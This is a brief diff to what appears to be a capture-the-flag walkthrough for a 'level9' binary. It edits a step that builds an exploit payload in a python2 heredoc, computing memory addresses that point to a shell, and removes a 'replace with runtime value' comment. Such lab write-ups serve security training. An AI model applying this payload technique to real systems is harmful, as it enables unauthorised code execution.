@@ -26,7 +26,7 @@ Steps:
 5) Run:
 	/home/user/level9/level9 "$(python2 - <<'PY'
 	import struct, sys
-	n1 = 0x0804a008  # replace with runtime value
+	n1 = 0x0804a008
 	annotation = n1 + 4
 	shell_addr = annotation + 4
 
